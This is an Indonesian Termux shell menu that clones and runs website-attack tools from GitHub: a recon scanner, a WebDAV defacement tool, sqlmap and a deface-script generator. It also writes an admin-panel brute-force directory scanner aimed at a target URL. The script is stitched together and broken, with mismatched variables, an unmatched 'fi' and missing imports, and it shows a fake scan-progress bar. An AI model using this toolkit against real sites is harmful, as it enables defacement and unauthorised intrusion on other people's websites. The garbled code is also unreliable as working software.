    ░███     ███░░███ ███░░███ ░███  ███░░   ██████████ ░███ ░░███░░███  ███░░  ░░░███░    ░░░░░███  ░███  ███░░███░░███░░███
    ░███    ░███ ░███░███ ░███ ░███ ░░█████ ░░░░░░░░░░  ░███  ░███ ░███ ░░█████   ░███      ███████  ░███ ░███████  ░███ ░░░ 
    ░███    ░███ ░███░███ ░███ ░███  ░░░░███            ░███  ░███ ░███  ░░░░███  ░███ ███ ███░░███  ░███ ░███░░░   ░███     
    █████   ░░██████ ░░██████  █████ ██████             █████ ████ █████ ██████   ░░█████ ░░████████ █████░░██████  █████    
   ░░░░░     ░░░░░░   ░░░░░░  ░░░░░ ░░░░░░             ░░░░░ ░░░░ ░░░░░ ░░░░░░     ░░░░░   ░░░░░░░░ ░░░░░  ░░░░░░  ░░░░░     
                                                                                                                             
                                                                                                                             
                                                                                                                             
'''
                                                                  
echo -e '''
│──────────────────────────────────────│
│[1]install redhawk                    │
│──────────────────────────────────────│
│──────────────────────────────────────│
│[2]install tools deface               │
│──────────────────────────────────────│
│[3]install sqlmap                     │
│──────────────────────────────────────│
│[4]Buat Script Deface                 │
│──────────────────────────────────────│
│[5]Munculin Animasi Kereta            │
│──────────────────────────────────────│
'''
echo ''
echo ''
echo ''


read -p "roOt $author ~# " pill
if [ $pill = 1 ]
then
clear

echo "Sabar....." 
echo
sleep 2
pkg install php
pkg install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php
fi

if [ $pill = 2 ]
then
clear

echo "selowww"
sleep 4
pkg install bash
pkg install git
git clone https://github.com/Mrzero406/webdav01
cd webdav01
sh webdav01.sh
fi

if [ $pill = 3 ]
then
clear
sleep 3

echo "Sabar-_-" 
sleep 3
pkg install python2
pkg install git
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python2 sqlmap.py
fi

if [ $pill = 4 ]
then
clear

echo "sabar slurr" 
sleep 5
pkg install python2
pkg install git
git clone https://github.com/4L13199/LITESCRIPT
cd LITESCRIPT
python2 LITESCRIPT.py
fi

if [ $pill = 5 ]
then
clear
pkg install sl
sl
fi
Tool
echo 'file telah tersimpan di halaman utama termux'
fi
if
[ $pilih = 5 ]
then
read -p 'nama anda ~> ' kali
cd $HOME
rm admin-finder
cat <<java>admin-finder.py
from aiohttp import ClientSession
import time
import socket
import os
import sys
def katas(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./20)




print(""" \33[97;1m
   ,▄▄▄▄▄,                                   ,▄▄▄▄▄
 ,█████▀""▀╕                               ▄▀╙"▀████▌
,█████     ║▄                             ╢"     █████
╫█████     ║█                             █⌐     █████▌
║Ö████▌,  ▄██                             ██▄  ,█████║▌
 █\33[96;1m▒,\33[97;1m▀▀▀▀████╛                             ▀███▀▀▀▀█\33[96;1m ▒\33[97;1m█
  ▀█\33[96;1m▒▒▒▒,\33[97;1m██"                               ╙██\33[96;1m▒▒▒▒,\33[97;1m█▀
    ╙▀▀▀▀          ,,              ,         ▀▀▀▀▀
                  █                ▀▄
                 ║▌       ,         █▌
                 ╙█      ▄██▄       █▌    \33[93;1mpanel_dark\33[97;1m
                  "▀▓▓▄▓█▀  ▀██▓▄▄▓▀^      \33[96;1mdirektory scanner by:
                                            \33[91;1m $kali  ∩( ・ω・)∩
""")
print('')
print('')
print('')
print('')
print('==================')
print('author: $kali     ')
print('==================')
target = input("\033[97mtarget url=>> ")
load = '▀'
count = 0

for x in range(101):
    time.sleep(0.4)
    print(f'\rPROSES MELIHAT DATA {x}% [{load}]', end='', flush=True)
    count += 1
    if count == 3:
        count = 0
        load += '▀'
print('\n[ WEB TARGET ONLINE ]')
print('mulai brute force')
print('100%')
enter = input("\033[97menter=>> ")
print("")
#Basic filter of input
target = target.replace('https://', '')
target = target.replace('http://', '')
tar_list = target.split('/')
for tar in tar_list:
    if tar == '':
        tar_list.remove(tar)
target = '/'.join(tar_list)
target = 'http://' + target

#define variables, functions, etc.
start = time.time()

yay = []

conn = aiohttp.TCPConnector(
        family=socket.AF_INET,
        verify_ssl=False,
    ) #used because of issues some might have with the AsyncResolver

async def fetch(url, session):
    async with session.get(url) as response:
        status = response.status #gets status codes to see if page is up
        if status == 200:
            print("\33[97;1mpew (>O_O)>  \33[1;0m{}\33[97;1m  <(O_O<) pew {}".format(response.url, status))
            yay.append(response.url)
        elif status == 404:
            print("\33[91;1mx_x \33[94;1m{}\33[91;1m x_x {}".format(response.url, status))
        elif status == 403:
            print("\33[91;1mx_x \33[94;1m{}\33[91;1m x_x \33[95;1m{}".format(response.url, status))
        else:
            print("\33[95;1m??? {} ??? {}".format(response.url, status))
        return await response.read()

async def run():
    url = target + "{}"
    tasks = []
    admin_list = open('admin.txt', 'r')
    paths = []
    for path in admin_list:
        path = path.replace('\n','')
        paths.append(path)

    async with ClientSession(connector=conn) as session: #creates the tasks
        for i in paths:
            task = asyncio.ensure_future(fetch(url.format(i), session))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses

#start loop
loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run())
loop.run_until_complete(future)

#Results
end = time.time()
script_time = end - start
print("\33[93;1mScan took {} seconds to complete\n".format(script_time))
print("\33[91;1m###### \33[93;1mDIREKTORY \33[91;1m######\33[1;0m")
if len(yay) == 0:
    print("\33[94;1m!!! Tidak menemukan direktory !!!")
else:
    for y in yay:
        print(y)
print("\33[91;1m#######################")
java
echo 'file telah tersimpan di halaman utama termux'
fi
if
[ $pilih = x ]
then
echo 'byeeeeee'
exit
echo 'byeeeeee'
fi
if
[ $pilih = X ]
then
echo 'byeeeee'
exit
echo 'byeeeee'
fi
